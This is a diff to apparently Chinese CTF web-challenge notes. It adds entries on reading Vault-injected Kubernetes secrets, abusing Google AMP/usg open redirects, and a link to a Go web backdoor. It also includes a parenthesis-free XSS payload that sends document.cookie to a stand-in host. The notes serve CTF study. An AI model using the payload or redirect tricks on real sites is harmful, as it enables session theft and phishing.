@@ -3324,3 +3324,7 @@ window.recaptcha=true;
 385. [Secret](https://d0ublew.github.io/posts/wgmy2023/web/secret/)
 - kubernetes+[HashiCorp Vault](https://zhuanlan.zhihu.com/p/30983205)。可下载[工具](https://developer.hashicorp.com/vault/install#Linux)并设置环境变量VAULT_ADDR为vault的地址然后尝试登录
 - 有些时候vault内保存的密码等敏感内容会被inject进kubernetes（参考 https://developer.hashicorp.com/vault/tutorials/kubernetes/kubernetes-sidecar ）。这时候文件可直接在`/vault/secrets`目录下读取
+386. [Report Google?](https://blog.rockhouse.dev/2023/12/20/wargames-my-2023/)
+- `https://www.google.com/amp/`后跟任意支持amp的网站即可实现重定向。另一种利用google重定向的方法参考 https://isc.sans.edu/diary/How+Malware+Campaigns+Employ+Google+Redirects+and+Analytics/19843 。后一种做法需要获取某个网站的usg内容，但是这个东西没法算，可以利用邮件让google生成后抄下来。其他参考链接： https://news.sophos.com/en-us/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/ ， https://github.com/aszx87410/blog/issues/87 ， https://vicevirus.github.io/posts/report-google-wgmy-2023/
+- 无括号xss payload：`<svg/onload=location=/\test.com/+document.cookie>`
+387. [tsh-go](https://github.com/CykuTW/tsh-go):go语言写的小型网站后门
